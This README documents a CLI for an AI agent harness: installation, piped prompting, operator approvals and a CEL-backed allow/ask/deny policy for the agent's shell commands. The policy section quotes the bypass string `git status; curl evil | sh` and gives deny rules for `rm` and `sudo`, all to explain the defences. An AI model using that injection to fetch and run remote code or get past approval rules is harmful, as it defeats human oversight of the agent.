# lisa-harness-cli

[Lisa Harness](https://github.com/Lisa-Harness/lisa) CLI interface.

## Install

### Give Lisa model access

The Lisa Harness supports several providers out-of-the-box.
To use one (or more), set the requisite environment variables:

| Provider       | Environment variables                                                                          |
| -------------- | ---------------------------------------------------------------------------------------------- |
| `openai`       | `LISA_OPENAI_API_KEY`                                                                          |
| `azure_openai` | `LISA_AZURE_OPENAI_ENDPOINT`, `LISA_AZURE_OPENAI_API_KEY`, `LISA_AZURE_OPENAI_API_VERSION`     |
| `anthropic`    | `LISA_ANTHROPIC_API_KEY`, `LISA_ANTHROPIC_BASE_URL`, `LISA_ANTHROPIC_VERSION`                  |
| `google`       | `LISA_GOOGLE_API_KEY`, `LISA_GOOGLE_API_BASE_URL`                                              |
| `openrouter`   | `LISA_OPENROUTER_API_KEY`, `LISA_OPENROUTER_BASE_URL`                                          |
| `aws`          | `LISA_AWS_ACCESS_KEY_ID`, `LISA_AWS_SECRET_ACCESS_KEY`, `LISA_AWS_REGION`                      |
| `ollama`       | `LISA_OLLAMA_HOST` *(optional)*                                                                |

Either in the shell that will run Lisa or,
Create the `~/.lisa` directory and copy/edit the [.env.example](.env.example) into it.

### Run the installer

```bash
curl -fsSL https://raw.githubusercontent.com/Lisa-Harness/lisa-harness-cli/main/install.sh | bash
```

The installer accepts the same options as a direct `uv tool install`
(e.g. `--provider ollama,openai`, `--source local --lisa-repo ~/Code/lisa`).

Or with pip / uv directly:

```bash
# Either
pip install lisa-harness-cli
# or
uv tool install lisa-harness-cli
```

## Usage

```bash
lisa            # show help (every command is one-shot)
lisa prompt "summarize the thread"   # run a single turn
lisa verify     # run the diagnostic smoke check
lisa --help     # show all commands
```

### Prompting (`prompt` with stdin and `--raw`)

`prompt` reads piped stdin automatically (when stdin is not a tty) and attaches
it to the turn ahead of your instruction, so config/data can flow through the
model into another command:

```bash
cat /etc/whatever.conf | lisa prompt "recommend improvements"
sudo systemctl status whatever 2>&1 | lisa prompt -r "fix it for me." > whatever.conf.new
```

`-r`/`--raw` writes the response verbatim to stdout — no Rule header, no
Markdown re-render, no `⚡` footer — moves activity output to stderr, and
prepends an output contract to the turn so the model emits only the requested
result (no preamble or commentary). Combine with `-q` to also suppress the
stderr activity lines. `--no-stdin` disables stdin attachment (use when a
foreground pipe should not be consumed). `-q -r` = only the raw response on
stdout.

An unresolved approval is a hard stop: the request id is durable,
the process prints the required decision commands to stderr and exits
with code `3`, so pipelines never mistake an un-decided approval for a
completed turn. Decide it from the same shell — no session needed — and re-run:

```bash
lisa prompt "approve <request-id>"           # run the paused action
lisa prompt "approve <request-id> --remember git status"   # persist an allow rule
lisa prompt "deny <request-id>"
```

(Bare `lisa prompt approve` with no id resolves to the single pending request.
A pre-armed decision also works in one shot:
`lisa prompt --approve <request-id> "continue the task"` dispatches the approval
first, then runs the turn.)

A model yield — the turn ends with the model asking you a question instead of
producing a result — is the same contract: the question prints to stderr, stdout
gets nothing, and the process exits with code `4`. The raw-mode contract tells
the model to make the best-supported inference from the provided material and
state assumptions in a trailing comment instead of asking; when even that is
impossible, re-run with the missing information included in the prompt.

### Approvals

By default, commands execute without an approval prompt only when the bash pack
reports a working, contained Bubblewrap sandbox — or when an explicit `allow`
rule matches (rules are evaluated ahead of the sandbox downgrade). Missing,
degraded, or unknown sandbox state fails closed and shows an approval panel
instead. A prompt run decides with the host machinery (the request id
survives the process boundary):

```bash
lisa prompt "approve <request-id>"                        # decide + re-run
lisa prompt "deny <request-id>"
lisa prompt "approve <request-id> --remember [prefix]"
```

The panel badges the sandbox state and shows the policy reason and effect tier
that fired, so you can see which rule or guard drove the prompt. `--remember`
persists an allow rule scoped to the tool and the command prefix — the default
prefix is the command's first two tokens (`git status` from `git status -sb`) —
rather than granting broad shell access; manage the accumulated rules with
`lisa prompt policy rule list` and `rule remove`.

### Policy (`lisa prompt policy`)

The approval policy is a CEL-backed YAML document at
`<data_dir>/config/policy.yaml` that decides which actions need operator
approval before they run. Inspect and change it from the same shell — no
session, no hand-editing (the host owns every policy write; the CLI just
sends the command text):

```bash
lisa prompt policy                        # show the active document (+ any load errors)
lisa prompt "policy mode trust"           # auto-allow write/execute (ask|trust|plan)
lisa prompt "policy bare off"             # stop prompting for unsandboxed execute
lisa prompt "policy rule list"            # rules with their remove addresses
lisa prompt 'policy rule add allow --tool bash_run --when action.argv[0] == "git" && action.argv.size() <= 2'
lisa prompt 'policy rule add deny --when ("rm" in action.argv) || ("sudo" in action.argv)'
lisa prompt "policy rule remove allow:1"  # drop rule 1 of the allow list
```

Changes take effect immediately — the engine re-reads `policy.yaml` on every
approval request. The default document is `mode: ask`, `sandbox_downgrade:
true`, `bare_requires_approval: true`, and no rules.

**Rules.** Each entry under `allow`/`ask`/`deny` is a matchers object; all
present matchers must match (a rule with no matchers matches nothing, and a
`when`-only rule is valid):

| Matcher | Matches |
| --- | --- |
| `tool` | exact tool id (e.g. `bash_run`) |
| `effect` | exact effect kind: `read` · `write` · `execute` · `external_write` |
| `pack` | exact owning pack id |
| `command_prefix` | the shell command starts with this string |
| `when` | a [CEL](https://github.com/google/cel-spec) boolean expression over the invocation |

The `when` expression is the powerful matcher. Its bindings cover the
structural facts (`action.tool`, `action.effect`, `action.pack`), the command
(`action.command` and `action.argv` — the command tokens, so token matching
closes the `command_prefix` shell-metacharacter bypass such as
`git status; curl evil | sh`), the full `action.parameters` map, `identity.*`
(workspace/user/surface/mode/scope), and `containment` (the resolved sandbox
state). CEL has no side effects and no I/O, so expressions are safe to
evaluate on every approval request. CEL string literals use double quotes, so
single-quote the YAML value; on `rule add`, pass the expression after `--when`
unquoted or in one outer shell quote — the raw tail is kept verbatim, inner
literals included:

```yaml
allow:
  - tool: bash_run
    when: 'action.argv[0] == "git" && action.argv.size() <= 2'
deny:
  - when: '("rm" in action.argv) || ("sudo" in action.argv)'
```

**Decision order.** For each approval-gated action the ladder is fixed and
short-circuiting: `deny` rules (loud — a tool error the model can reroute on,
never a silent skip), then `ask` rules, then `allow` rules, then the sandbox
downgrade (a `contained` `execute` auto-approves even under `plan` mode;
degraded, none, and unknown containment fail closed), then the mode fallback
(`read` always allows, `plan` denies every effectful action, `trust` allows
`write`/`execute`, `ask` prompts). Auto-approvals are auditable and capped at
10 per turn — beyond the cap the host prompts instead of continuing.

Two things never ride the dial: an `external_write` escapes the sandbox by
definition, so auto-approving one takes an explicit allow rule, and an
unsandboxed `execute` prompts even under `trust` while
`bare_requires_approval` is on (`policy bare on|off`).

**Fail closed.** A missing, invalid, or non-mapping `policy.yaml` — or one
whose `when` expression does not compile — loads as ask-mode defaults with no
rules, and `lisa prompt policy` renders the load error. An expression that
fails at evaluation time prompts instead of skipping the rule (a skipped
`deny` would be an allowed `rm`). `rule add` compile-checks `--when` before
the write, so a bad add is rejected rather than poisoning the document.

The full authoring reference — the bindings table, more rule examples,
containment states, and quoting rules — lives in
`../lisa/docs/POLICY_GUIDE.md` in the framework checkout.

### Lazy `prompt` routing

Set `LISA_PROMPT_UNKNOWN=1` to let an unrecognized first positional become
the `prompt` message, so you can skip typing `prompt` for ad-hoc one-shots:

```bash
LISA_PROMPT_UNKNOWN=1 lisa "do something"
```

Registered subcommands (`verify`, `pack`, `models`, …) are never rerouted,
so the env var is safe to leave on. Runtime options belong to each
subcommand (`lisa prompt --log-level debug …`). Prompt-only flags
(`-r/--raw`, `-q/--quiet`, `--stdin/--no-stdin`) appearing before the
positional are hoisted after the injected `prompt` token, so
`lisa -r "fix it"` parses as `lisa prompt -r "fix it"`.

### Profiles (`--profile`, `LISA_PROFILE`)

A **profile** is a named sub-workspace of the data dir:
`~/.lisa/profiles/<name>`. It isolates the whole category tree below —
threads, `memory.db`, `models.yaml`, `policy.yaml`, approvals, `files/` —
while **sharing the base packs venv**, so packs are installed once and
discovered from every profile:

```text
~/.lisa/                          # base data dir
├── config/  state/  data/  cache/  logs/  run/
├── venv/                         # packs venv — shared by all profiles
└── profiles/
    └── ansible/                  # LISA_PROFILE=ansible (or --profile ansible)
        ├── config/  state/  data/  cache/  logs/  run/
        └── (no venv/ — resolves to the base venv)
```

```bash
lisa --profile ansible            # one-shot: use the 'ansible' profile
LISA_PROFILE=ansible lisa         # env var form (persistent for the shell)
lisa --profile ansible verify     # works on every subcommand
```

Precedence: `--data-dir` (explicit) > `LISA_DATA_DIR` > `--profile` /
`LISA_PROFILE` > `~/.lisa`. A fresh profile starts empty (defaults, like a
fresh install); seed it from the base dir when you want a head start:

```bash
mkdir -p ~/.lisa/profiles/ansible/config
cp ~/.lisa/config/models.yaml ~/.lisa/profiles/ansible/config/
```

Note: a profile switches the auto-discovered `config/session_context.md`
like any other config file, but an explicit `--session-context` flag or
`LISA_SESSION_CONTEXT_PATH` still takes precedence over whatever the
profile carries.

(The profile name must be a single path-safe segment — letters, digits,
`-`, `_`, `.`.)

### Data directory layout

The data dir (base or profile) groups everything into lifecycle
categories; the names live in one place (`sdk.layout`):

```text
~/.lisa/
├── config/    models.yaml · policy.yaml · session_context.md
│              (mcp_servers.yaml and overlays/ appear when a pack or your
│               setup adds them — they are optional, not seeded by default)
├── state/     installed-packs.json · state.json · approvals.json ·
│              recovery-items.json · code-change-artifacts.json ·
│              repl_history.txt · models.proposed.yaml
│              (written as needed; a clean install may not have them all —
│               state.json and code-change-artifacts.json appear on first use)
├── data/      memory.db · threads/ · files/ · backups/
├── cache/     fetch/ · layers/    (rm-safe)
├── logs/      host.jsonl · token-usage.jsonl · mcp/<server_id>.jsonl
│              · pack logs (e.g. bash-<session>.log, bwrap-<session>.log)
├── run/       per-session execution state, keyed by session hash (rm-safe):
│              <key>/ jobs/ · scratch/ · profile/ · sandbox-facts.json ·
│              per-session logs (e.g. bash-<key>.log)
├── venv/      packs venv (shared with profiles)
└── .env
```

`cache/` and `run/` can be deleted at any time. A backup of `config/`,
`state/`, and `data/` captures everything durable.

## Development

This repo is a uv workspace whose only member is `hosts/cli/` (src layout:
`hosts/cli/src/hosts/cli/`), matching the framework packages in the sibling
`../lisa` checkout. The layout is:

```text
Code/
├── lisa/              # framework (kernel, sdk, mcp_server, host)
└── lisa-hosts/
    └── cli/           # this repo
```

Until the framework packages are published to PyPI, a clone needs the
sibling framework checkout:

```bash
git clone https://github.com/Lisa-Harness/lisa-hosts-cli.git lisa-hosts
# (cli is the lisa-hosts repo; lisa is the framework repo)
git clone https://github.com/Lisa-Harness/lisa.git

cd lisa-hosts/cli
# edit pyproject.toml: uncomment the lisa-* path sources (sibling ../lisa)
uv sync --extra dev
uv run pytest -m "not live"
uv run lisa --help
```

## Architecture

`lisa-harness-cli` wraps the transport-neutral `host` runtime (from `lisa-host-runtime`)
with a Typer + Rich terminal interface. Every command is a one-shot process; turns
run through `lisa prompt` and its `PromptTransport` renders the turn trajectory to
scrollback. The CLI implements `TransportCallbacks`; the runtime never imports
Rich, Typer, or any transport-specific code.

See `../lisa/docs/BOUNDARIES.md` for the full architecture.
